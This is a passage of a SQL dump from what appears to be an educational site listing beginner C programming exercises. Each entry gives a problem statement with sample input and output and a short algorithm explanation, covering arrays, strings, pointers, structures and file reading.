1:\r\n</p><p style=\"line-height: 1;\">7 5 9 3 1</p>','B','','prog/c/fhreversearray.c','<p style=\"line-height: 1;\">initialize i to first location of array and j to middle location of array using\r\ni=0\r\nj=n/2-1</p><p style=\"line-height: 1;\">\r\n\r\nswap the elements in location i and j, then increment i by 1 and decrement j by 1.\r\n</p><p style=\"line-height: 1;\">t=a[i]\r\na[i]=a[j]\r\na[j]=temp\r\n\r\nrepeat the above step till i is less than j </p>',5,NULL,NULL,NULL),(780,'C Program to reverse the second half of array elements','C-Program-to-reverse-the-second-half-of-array-elements','<p style=\"line-height: 1;\">Get array size n and n elements of array, then reverse the second n/2 elements.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5 7 1 3 9</p>','B','','prog/c/shreversearray.c','<p style=\"line-height: 1;\">initialize i to  middle location of array and j to last location of array using\r\ni=n/2\r\nj=n-1\r\n</p><p style=\"line-height: 1;\">\r\nswap the elements in location i and j, then increment i by 1 and decrement j by 1.\r\n</p><p style=\"line-height: 1;\">t=a[i]\r\na[i]=a[j]\r\na[j]=temp\r\n\r\nrepeat the above step till i is less than j </p>',5,NULL,NULL,NULL),(781,'C Program to Sort the Elements in ascending order','C-Program-to-Sort-the-Elements-in-ascending-order','<p style=\"line-height: 1;\">Get array size n and n elements of array, then sort the elements of array in ascending order.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n1 3 5 7 9</p>','B','','prog/c/sortarray.c','Bubble Sort Algorithm: \r\nRefer : https://www.tutorialspoint.com/data_structures_algorithms/bubble_sort_algorithm.htm',5,NULL,NULL,NULL),(782,'C Program to Sort the Elements in descending order','C-Program-to-Sort-the-Elements-in-descending-order','<p style=\"line-height: 1;\">Get array size n and n elements of array, then sort the elements of array in descending order.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n9 7 5 3 1</p>','B','','prog/c/sortarrayd.c','Bubble Sort Algorithm: \r\nRefer : https://www.tutorialspoint.com/data_structures_algorithms/bubble_sort_algorithm.htm',5,NULL,NULL,NULL),(783,'C Program to sort half of the Array elements in ascending order and next half in descending order','C-Program-to-sort-half-of-the-Array-elements-in-ascending-order-and-next-half-in-descending-order','<p style=\"line-height: 1;\">Get array size n and n elements of array, then sort the first half elements of array in ascending order and sort second half elements of array in descending order.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1 3 9 7 5</p>','B','','prog/c/halfsort.c','Bubble Sort Algorithm: \r\nRefer : https://www.tutorialspoint.com/data_structures_algorithms/bubble_sort_algorithm.htm',5,NULL,NULL,NULL),(784,'C Program to Merging two arrays','C-Program-to-Merging-two-arrays','<p style=\"line-height: 1;\">Get two arrays and merge them into single array.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n3\r\n5 4 2\r\n4\r\n9 7 6 3</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n5 4 2 9 7 6 3</p>','B','','prog/c/mergearray.c','<p style=\"line-height: 1;\">Create a new array with size of size of a array  + size of b array.</p><p style=\"line-height: 1;\"> C[n+m]&nbsp; visit elements of a array and store it in c.</p><p style=\"line-height: 1;\">&nbsp;c[i]=a[j]&nbsp; i++ visit elements of b array and store it in c.</p><p style=\"line-height: 1;\"> c[i]=b[j] i++</p>',5,NULL,NULL,NULL),(785,'C Program to replace every element with the greatest element on right side','C-Program-to-replace-every-element-with-the-greatest-element-on-right-side','<p style=\"line-height: 1;\">Get array size n and n elements of array, replace every elements with the greatest element located in right side.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n9 9 3 3 1</p>','B','','prog/c/rightmax.c','visit each location in array\r\n\r\nfind the greatest element (max)next to the location using\r\nfor(j=i+2;j<n;j++)\r\n\r\nStore the max in current location by\r\na[i] = max',5,NULL,NULL,NULL),(786,'C Program to perform circular Array Rotation','C-Program-to-perform-circular-Array-Rotation','<p style=\"line-height: 1;\">Get array size n and n elements of array, rotate the elements of array in left side for m times.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n2</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n9 3 1 5 7</p>','B','','prog/c/circularrotation.c','repeat the below steps for m times:\r\nstore the a[0] in temp\r\ntemp=a[0]\r\n\r\nmove all elements located in 1 to n-1 to its previous location\r\na[j-1]=a[j]\r\n\r\nstore the temp in a[n-1]\r\na[n-1]=temp',5,NULL,NULL,NULL),(787,'C Program to add two matrix','C-Program-to-add-two-matrix','yet to be updated','B','','prog/c/matrixaddition.c','yet to be updated',5,NULL,NULL,NULL),(788,'C Program to multiply two matrix','C-Program-to-multiply-two-matrix','yet to be updated','B','','prog/c/matrixmultiplication.c','yet to be updated',5,NULL,NULL,NULL),(789,'C Program to transpose the Matrix','C-Program-to-transpose-the-Matrix','yet to be updated','B','','prog/c/matrixtranspose.c','yet to be updated',5,NULL,NULL,NULL),(790,'Print the characters of String with space','Print-the-characters-of-String-with-space','<p style=\"line-height: 1;\">Get  a String and Prints it characters with Space\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">Hello</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nH e l l o </p>','B','','prog/c/printchars.c','<p style=\"line-height: 1;\">Get a String using fgets() function. </p><p style=\"line-height: 1;\">\r\nStr -&gt; reads the string and stores it in str.\r\n</p><p style=\"line-height: 1;\">50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nusing for loop print all characters one by one.</p><p style=\"line-height: 1;\">\r\n\r\n\"%c \" in printf prints character with space.</p>',6,NULL,NULL,NULL),(791,'Find the Length of given String','Find-the-Length-of-given-String','<p style=\"line-height: 1;\">Get a String and count the characters in the string\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nHello</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n5</p>','B','','prog/c/length.c','<p style=\"line-height: 1;\">Get a String using fgets() function. </p><p style=\"line-height: 1;\">\r\nStr -&gt; reads the string and stores it in str.</p><p style=\"line-height: 1;\">\r\n50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nwhile loop iterates untill str has  or&nbsp;</p><p style=\"line-height: 1;\">variable I increaments at each iteration, so finally i is the length of String.\r\n</p>',6,NULL,NULL,NULL),(792,'Find the location of given Character in a String','Find-the-location-of-given-Character-in-a-String','<p style=\"line-height: 1;\">Get a String and a character then find where the character occurred first in the string.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">Hello\r\nl</p><p style=\"line-height: 1;\">Sample Output:\r\n</p><p style=\"line-height: 1;\">2</p>','B','','prog/c/findchar.c','<p style=\"line-height: 1;\">Get a String using fgets() function. </p><p style=\"line-height: 1;\">\r\nStr -&gt; reads the string and stores it in str.\r\n</p><p style=\"line-height: 1;\">50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nread character s using scanf()\r\n\r\nfor loop iterates and check each character whether it is  s. </p><p style=\"line-height: 1;\">if(str[i]==s) then prints I, else moves to next character.\r\n</p>',6,NULL,NULL,NULL),(793,'Count the occurences of given Character in a String','Count-the-occurences-of-given-Character-in-a-String','<p style=\"line-height: 1;\">Get a String and a character then count the occurrence of character in the string.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nHello\r\no\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n1</p>','B','','prog/c/countchar.c','<p style=\"line-height: 1;\">Get a String using fgets() function. </p><p style=\"line-height: 1;\">\r\nStr -&gt; reads the string and stores it in str.\r\n</p><p style=\"line-height: 1;\">50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nread character s using scanf()\r\n\r\nfor loop iterates and check each character whether it is  s. if(str[i]==s) then variable count is incremented by 1, else moves to next character.\r\n</p><p style=\"line-height: 1;\">\r\nFinally prints the count.\r\n</p>',6,NULL,NULL,NULL),(794,'Covert Lowercase characters to Uppercase Characters','Covert-Lowercase-characters-to-Uppercase-Characters','<p style=\"line-height: 1;\">Get a String and convert the lower case characters to upper case Characters\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">Hello</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">HELLO</p>','B','','prog/c/lowertoupper.c','<p style=\"line-height: 1;\">Get a String using fgets() function. </p><p style=\"line-height: 1;\">\r\nStr -&gt; reads the string and stores it in str.</p><p style=\"line-height: 1;\">\r\n50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nASCII value of A to Z is 65 - 90 and a to z is 97 to 122.\r\n</p><p style=\"line-height: 1;\">\r\nfor loop iterates and check each character whether it is  s a to z, if it is in a to z then decrement it with 32 to get Upper Case.\r\n\r\n</p>',6,NULL,NULL,NULL),(795,'Covert Uppercase characters to Lowercase Characters','Covert-Uppercase-characters-to-Lowercase-Characters','<p style=\"line-height: 1;\">Get a String and convert the upper case characters tolower case Characters\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nHello</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nhello</p>','B','','prog/c/uppertolower.c','<p style=\"line-height: 1;\">Get a String using fgets() function. </p><p style=\"line-height: 1;\">\r\nStr -&gt; reads the string and stores it in str.\r\n</p><p style=\"line-height: 1;\">50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nASCII value of A to Z is 65 - 90 and a to z is 97 to 122.\r\n</p><p style=\"line-height: 1;\">\r\nfor loop iterates and check each character whether it is  s A to Z, if it is in A to Z then increment it with 32 to get Lower Case.\r\n\r\n</p>',6,NULL,NULL,NULL),(796,'Count the number of vowels in given string','Count-the-number-of-vowels-in-given-string','<p style=\"line-height: 1;\">Get a String and count the number of vowels occurred in string.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nHello\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">2</p>','B','','prog/c/vowels.c','<p style=\"line-height: 1;\">Get a String using fgets() function. </p><p style=\"line-height: 1;\">\r\nStr -&gt; reads the string and stores it in str.\r\n</p><p style=\"line-height: 1;\">50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nstore vowels in array s.\r\n</p><p style=\"line-height: 1;\">\r\nfor loop iterates and check each character whether it is  in array s using inner for loop.</p><p style=\"line-height: 1;\">if it is in s, then increment count.\r\n\r\nFinally prints count.\r\n</p>',6,NULL,NULL,NULL),(797,'Compare  two Strings are equal','Compare-two-Strings-are-equal','<p style=\"line-height: 1;\">Get two strings and check whether both are equal\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nMARK\r\nMAKE\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nNot Equal</p>','B','','prog/c/compare.c','<p style=\"line-height: 1;\">Get two String using fgets() function. </p><p style=\"line-height: 1;\">\r\nStr -&gt; reads the string and stores it in str.\r\n</p><p style=\"line-height: 1;\">50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nfirst compare the length of both the strings, if it is equal check whether each character of both the string is equal.</p><p style=\"line-height: 1;\"> Else print \"both are not equal\".\r\n</p><p style=\"line-height: 1;\">\r\nif each character in both the string are equal print \"Both are equal\" Else print \"both are not equal\".\r\n</p>',6,NULL,NULL,NULL),(798,'Concate two given Strings','Concate-two-given-Strings','<p style=\"line-height: 1;\">Get two strings and join them as a single string.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">MARK\r\nMAKE\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">MARKMAKE</p>','B','','prog/c/concate.c','<p style=\"line-height: 1;\">Get two String using fgets() function. </p><p style=\"line-height: 1;\">\r\nStr -&gt; reads the string and stores it in str.</p><p style=\"line-height: 1;\">\r\n50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nFirst store the string str1 in str, then store str2 in str using two sequential for loops.\r\n</p>',6,NULL,NULL,NULL),(799,'Find the location of given sub string in a String','Find-the-location-of-given-sub-string-in-a-String','<p style=\"line-height: 1;\">Get a String and Substring and find where the substring is present in String.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nentertainment\r\nain</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">6</p>','B','','prog/c/substring.c','<p style=\"line-height: 1;\">check whether first character of sub string is equal to any character in string.</p><p style=\"line-height: 1;\"> If it is equal, then check remaining characters are equal to the characters in substring. </p><p style=\"line-height: 1;\"> else move to next character.</p>',6,NULL,NULL,NULL),(800,'Count the occurences of given substring in a String','Count-the-occurences-of-given-substring-in-a-String','<p style=\"line-height: 1;\">Get a String and Substring and count the occurrence of substring in string.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nentertainment\r\nen\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n2</p>','B','','prog/c/countsubstring.c','<p style=\"line-height: 1;\">check whether first character of sub string is equal to any character in string.</p><p style=\"line-height: 1;\"> If it is equal, then check remaining characters are equal to the characters in substring.</p><p style=\"line-height: 1;\">  else move to next character.</p>',6,NULL,NULL,NULL),(801,'Reverse the given String','Reverse-the-given-String','<p style=\"line-height: 1;\">Get a String and reverse the characters of the string\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nHello</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nolleH</p>','B','','prog/c/reverse.c','<p>initialize i to first location of string and j to last location of string using\r\ni=0\r\nj=n-1</p><p>\r\n\r\nswap the characters in location i and j, then increment i by 1 and decrement j by 1.\r\n</p><p style=\"line-height: 1;\">t=str[i]\r\nstr[i]=str[j]\r\nstr[j]=temp\r\n\r\nrepeat the above step till i is less than j </p>',6,NULL,NULL,NULL),(802,'Check the given string is Palindronme','Check-the-given-string-is-Palindronme','<p style=\"line-height: 1;\">Get a String and reverse the characters of the string. And check whether reverse order and original order is same.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nmadam</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nPalindrome</p>','B','','prog/c/palindromne.c','<p style=\"line-height: 1;\">initialize i to first location of string and j to last location of string using\r\ni=0\r\nj=n-1\r\n\r\nmove the characters of str in location i and j to str1, then increment i by 1 and decrement j by 1.</p><p style=\"line-height: 1;\">\r\nstr1[j]=str[i]\r\nstr1[i]=str[j]\r\n\r\nrepeat the above step till i is less than j \r\n\r\nCompare str and str1, if the both are same then print \"Palindromne\". else \"Not Palindromne\".</p>',6,NULL,NULL,NULL),(803,'Remove the spaces in given String','Remove-the-spaces-in-given-String','<p style=\"line-height: 1;\">Get a String and remove the spaces\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\"> Hello World</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nHelloWorld</p>','B','','prog/c/removespaces.c','<p style=\"line-height: 1;\">Intialize two variables I and j as 0.\r\n</p><p style=\"line-height: 1;\">\r\nif it is space simply increment i.</p><p style=\"line-height: 1;\">\r\n\r\nIf it is non-space store the character from index I to index j.</p>',6,NULL,NULL,NULL),(804,'Remove the Vowels in given String','Remove-the-Vowels-in-given-String','<p style=\"line-height: 1;\">Get a String and remove the vowels</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\"> Hello World</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">Hll Wrld</p>','B','','prog/c/removevowels.c','<p style=\"line-height: 1;\">Initialize two variables I and j as 0.\r\n</p><p style=\"line-height: 1;\">\r\nif it is vowel simply increment i.</p><p style=\"line-height: 1;\">\r\n\r\nIf it is non-vowel store the character from index I to index j.</p>',6,NULL,NULL,NULL),(805,'C Program to get and print the array elements using pointers','C-Program-to-get-and-print-the-array-elements-using-pointers','<p style=\"line-height: 1;\">Get array size n and n elements of array, then print the elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n5 7 9 3 1</p>','B','','prog/c/printarr_p.c','<p style=\"line-height: 1;\">calloc() is predefined function allocates memory of specified bytes.</p><p style=\"line-height: 1;\">\r\nNumber of bytes is specified as (4,n), it means n 4 bytes.</p><p style=\"line-height: 1;\"> Since we are using integers, specified as 4 bytes.</p><p style=\"line-height: 1;\">\r\n\r\n*a denotes first four bytes,  *(a+1) denotes second four bytes, *(a+2) denotes third four bytes and so on.,\r\n\r\n\r\ni is initialized to 0 and incremented by 1 at each iteration of both the for loops.\r\n</p><p style=\"line-height: 1;\">\r\nFirst for loop reads n input numbers from user and stores them in array a[] from location 0 to n-1\r\n</p><p style=\"line-height: 1;\">\r\nSecond for loop prints the n elements of array located from 0 to n-1.</p>',7,NULL,NULL,NULL),(806,'C Program to find the sum of array elements using pointers','C-Program-to-find-the-sum-of-array-elements-using-pointers','<p style=\"line-height: 1;\">Get array size n and n elements of array, then compute sum of the elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1&nbsp;</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n25</p>','B','','prog/c/sumarray_p.c','<p style=\"line-height: 1;\">calloc() is predefined function allocates memory of specified bytes.</p><p style=\"line-height: 1;\"> Number of bytes is specified as (4,n), it means n 4 bytes. </p><p style=\"line-height: 1;\">Since we are using integers, specified as 4 bytes.</p><p style=\"line-height: 1;\"> *a denotes first four bytes,  *(a+1) denotes second four bytes, *(a+2) denotes third four bytes and so on., i is initialized to 0 and incremented by 1 at each iteration of both the for loops.</p><p style=\"line-height: 1;\">&nbsp;First for loop reads n input numbers from user and stores them in array a[] from location 0 to n-1</p><p style=\"line-height: 1;\">Second for loop adds all the n elements of array located from 0 to n-1</p><p style=\"line-height: 1;\"> Finally prints the sum using printf statement.</p>',7,NULL,NULL,NULL),(807,'C Program to Search an Element in an array using Pointers','C-Program-to-Search-an-Element-in-an-array-using-Pointers','<p style=\"line-height: 1;\">Get an element and find the location of element in array, print -1 if element is not found.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n9</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">2</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n4</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">-1</p>','B','','prog/c/linearsearch_p.c','<p style=\"line-height: 1;\">calloc() is predefined function allocates memory of specified bytes.</p><p style=\"line-height: 1;\">Number of bytes is specified as (4,n), it means n 4 bytes. </p><p style=\"line-height: 1;\">Since we are using integers, specified as 4 bytes.</p><p style=\"line-height: 1;\">*a denotes first four bytes,  *(a+1) denotes second four bytes, *(a+2) denotes third four bytes and so on., i is initialized to 0 and incremented by 1 at each iteration of both the for loops.</p><p style=\"line-height: 1;\">&nbsp;First for loop reads n input numbers from user and stores them in array a[] from location 0 to n-1&nbsp; using Second for loop the element is searched in each location from 0 to  the location of element or location n-1. </p><p style=\"line-height: 1;\">if element is found in a location that location i is stored as pos and exit from the for loop using break statement.</p><p style=\"line-height: 1;\">&nbsp;if element is not found from 0 to n-1 location, pos remains -1.</p>',7,NULL,NULL,NULL),(808,'C Program to find Smallest element in the array using pointers','C-Program-to-find-Smallest-element-in-the-array-using-pointers','<p style=\"line-height: 1;\">Get array size n and n elements of array, then find the smallest element among those elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">sample Output 1:</p><p style=\"line-height: 1;\">\r\n1</p>','B','','prog/c/min_p.c','<p style=\"line-height: 1;\">calloc() is predefined function allocates memory of specified bytes.\r\n</p><p style=\"line-height: 1;\">Number of bytes is specified as (4,n), it means n 4 bytes. </p><p style=\"line-height: 1;\">Since we are using integers, specified as 4 bytes.\r\n</p><p style=\"line-height: 1;\">\r\n*a denotes first four bytes,  *(a+1) denotes second four bytes, *(a+2) denotes third four bytes and so on.,\r\ni is initialized to 0 and incremented by 1 at each iteration of both the for loops.</p><p style=\"line-height: 1;\">\r\n\r\nFirst for loop reads n input numbers from user and stores them in array a[] from location 0 to n-1\r\n\r\nInitially assign the element located at 0 to max using min =*a.</p><p style=\"line-height: 1;\">\r\n\r\nusing second for loop visit each  location serially from 1 to n-1. </p><p style=\"line-height: 1;\">if the element located in any position is lesser than min,  then assign the element as max by using min = *(a+i)\r\n\r\nfinally min holds the minimum value in the list.</p>',7,NULL,NULL,NULL),(809,'C Program to Reverse the Elements in array using pointers','C-Program-to-Reverse-the-Elements-in-array-using-pointers','<p style=\"line-height: 1;\">Get array size n and n elements of array, then reverse the n elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n1 3 9 7 5</p>','B','','prog/c/reversearray_p.c','<p style=\"line-height: 1;\">calloc() is predefined function allocates memory of specified bytes</p><p style=\"line-height: 1;\">Number of bytes is specified as (4,n), it means n 4 bytes. </p><p style=\"line-height: 1;\">Since we are using integers, specified as 4 bytes.</p><p style=\"line-height: 1;\">*a denotes first four bytes,  *(a+1) denotes second four bytes, *(a+2) denotes third four bytes and so on., initialize i to first location of array and j to last location of array using i=0 j=n-1</p><p style=\"line-height: 1;\">swap the elements in location i and j, then increment i by 1 and decrement j by 1.</p><p style=\"line-height: 1;\">&nbsp;t=*(a+i)*(a+i)=*(a+j) *(a+j)=temp repeat the above step till i is less than j </p>',7,NULL,NULL,NULL),(810,'C Program to Sort the Elements in ascending order using pointers','C-Program-to-Sort-the-Elements-in-ascending-order-using-pointers','<p style=\"line-height: 1;\">Get array size n and n elements of array, then sort the elements of array in ascending order.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n1 3 5 7 9</p>','B','','prog/c/sortarray_p.c','Bubble Sort Algorithm: \r\nRefer : https://www.tutorialspoint.com/data_structures_algorithms/bubble_sort_algorithm.htm',7,NULL,NULL,NULL),(811,'Find the Length of given String using Pointers','Find-the-Length-of-given-String-using-Pointers','<p style=\"line-height: 1;\">Get a String and count the characters in the string\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nHello\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n5</p>','B','','prog/c/length_p.c','<p style=\"line-height: 1;\">Get a String using fgets() function.</p><p style=\"line-height: 1;\"> \r\nStr -&gt; reads the string and stores it in str.\r\n</p><p style=\"line-height: 1;\">50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nwhile loop iterates untill str has  or \r\n. variable I increaments at each iteration, so finally i is the length of String.\r\n</p>',7,NULL,NULL,NULL),(812,'Find the location of given Character in a String using Pointers','Find-the-location-of-given-Character-in-a-String-using-Pointers','<p style=\"line-height: 1;\">Get a String and a character then find where the character occurred first in the string.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nHello\r\nl</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n2</p>','B','','prog/c/findchar_p.c','<p style=\"line-height: 1;\">Get a String using fgets() function. </p><p style=\"line-height: 1;\">\r\nStr -&gt; reads the string and stores it in str.\r\n</p><p style=\"line-height: 1;\">50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nread character s using scanf()\r\n\r\nfor loop iterates and check each character whether it is  s.</p><p style=\"line-height: 1;\"> if(str[i]==s) then prints I, else moves to next character.\r\n</p>',7,NULL,NULL,NULL),(813,'Covert Lowercase characters to Uppercase Characters using Pointers','Covert-Lowercase-characters-to-Uppercase-Characters-using-Pointers','<p style=\"line-height: 1;\">Get a String and convert the upper case characters to lower case Characters</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nHello</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nhello</p>','B','','prog/c/lowertoupper_p.c','<p style=\"line-height: 1;\">Get a String using fgets() function.</p><p style=\"line-height: 1;\">\r\nStr -&gt; reads the string and stores it in str.\r\n</p><p style=\"line-height: 1;\">50 -&gt; reads maximum of 50 characters\r\nstdin-&gt; reads character from keyboard\r\n\r\nASCII value of A to Z is 65 - 90 and a to z is 97 to 122.\r\n</p><p style=\"line-height: 1;\">\r\nfor loop iterates and check each character whether it is  s A to Z, if it is in A to Z then increment it with 32 to get Lower Case.\r\n\r\n</p>',7,NULL,NULL,NULL),(814,'Remove the spaces in given String using Pointers','Remove-the-spaces-in-given-String-using-Pointers','<p style=\"line-height: 1;\">Get a String and remove the spaces\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\"> Hello World</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nHelloWorld</p>','B','','prog/c/removespaces_p.c','<p style=\"line-height: 1;\">Intialize two variables I and j as 0.\r\n</p><p style=\"line-height: 1;\">\r\nif it is space simply increment i.</p><p style=\"line-height: 1;\">\r\n\r\nIf it is non-space store the character from index I to index j.</p>',7,NULL,NULL,NULL),(815,'Add two lengths','Add-two-lengths','<p style=\"line-height: 1;\">Get two lengths in feet and inches and add them</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n6:03\r\n4:11\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n11:02</p>','B','','prog/c/addlength.c','<p style=\"line-height: 1;\">l1,l2 and l3 are structure variables, each occupies 8 btyes. </p><p style=\"line-height: 1;\">4 bytes for feet and 4 bytes for feet.</p><p style=\"line-height: 1;\">\r\n\r\nAdd inches of l1 and l2 and store it in l3, then add feets of l1 and l2 and store it in l3.\r\n</p><p style=\"line-height: 1;\">if l3 inches is greater than 11 then increment l3 feet by and decrement l3 inch by 12.</p>',8,NULL,NULL,NULL),(816,'Add two time','Add-two-time','<p style=\"line-height: 1;\">Get two time in hour and minutes and add them\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">6:03\r\n4:59</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n11:02</p>','B','','prog/c/addtime.c','<p style=\"line-height: 1;\">t1,t2 and t3 are structure variables, each occupies 8 bytes. </p><p style=\"line-height: 1;\">4 bytes for hour and 4 bytes for minutes.</p><p style=\"line-height: 1;\">\r\nAdd minutes of t1 and t2 and store it in t3, then add hours of t1 and t2 and store it in t3.\r\n</p><p style=\"line-height: 1;\">if l3 minutes is greater than 59 then increment t3 time by and decrement t3 minutes by 60.</p>',8,NULL,NULL,NULL),(817,'Student Mark Calculation using Structures','Student-Mark-Calculation-using-Structures','Get 5 subject marks of n students and calculate the average of each','B','','prog/c/student.c','create a structure variable as array and store the student details.',8,NULL,NULL,NULL),(818,'Emploee Salary Calculation using Structures','Emploee-Salary-Calculation-using-Structures','Get wages of n employees and calculate the basic pay, HRA and Net pay of each employee.','B','','prog/c/employee.c','create a structure variable as array and store the employee details.',8,NULL,NULL,NULL),(819,'Example to Illustrate Union','Example-to-Illustrate-Union','Illustrate how members of union are sharing same memory.','B','','prog/c/union.c','because both x any shares same memory changes in on variable affects the another.',8,NULL,NULL,NULL),(820,'Read the content of File','Read-the-content-of-File','read the contents of sample.txt file and display it.','B','','prog/c/readfile.c','<p style=\"line-height: 1;\">fopen() to open the specified file.</p><p style=\"line-height: 1;\"> \"sample.txt\" is file name. </p><p style=\"line-height: 1;\">\"r\" denotes open it in read 